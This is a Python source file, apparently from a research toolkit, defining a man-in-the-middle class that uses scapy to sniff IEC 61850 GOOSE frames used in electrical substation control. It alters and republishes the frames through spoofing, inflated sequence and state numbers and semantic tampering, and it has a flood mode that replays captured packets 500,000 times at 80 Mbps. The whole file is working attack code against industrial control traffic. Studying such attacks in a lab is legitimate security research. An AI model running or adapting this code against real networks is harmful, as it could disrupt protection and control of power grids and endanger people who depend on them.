from Publisher import Publisher
from Subscriber import Subscriber
from scapy.all import *

DESTINATION = "01:0c:cd:01:00:33"
TYPE = 35000
IFACE = "Ethernet"
FILTER = "ether proto 35000"

class MITM:
    def __init__(self, type=0):
        self.publisher = Publisher()
        self.subscriber = Subscriber(DESTINATION, TYPE, IFACE, FILTER, self.callback)
        self.type = type

    def callback(self, packet):
        print(packet)
        
        package = self.subscriber.getPackage()
        package.setSource(packet[Ether].src)
        package.setDestination(packet[Ether].dst)
        package.decodePackage(packet.load)

        isEvent = False

        if self.type == 0:
            isEvent = package.spoof()
        elif self.type == 1:
            isEvent = package.highSequence()
        elif self.type == 2:
            isEvent = package.highState()
        elif self.type == 3:
            isEvent = package.semantic()
        elif self.type == 4:
            #Works only in Linux
            sendpfast(packet, mbps=80, loop=500000)
            return

        self.publisher.setPackage(package)

        if isEvent:
            self.publisher.publishEvent()
        else:
            self.publisher.publish()
    
    def sniff(self):
        while True:
            self.subscriber.sniff()
            if self.type == 0 or self.type == 1:
                break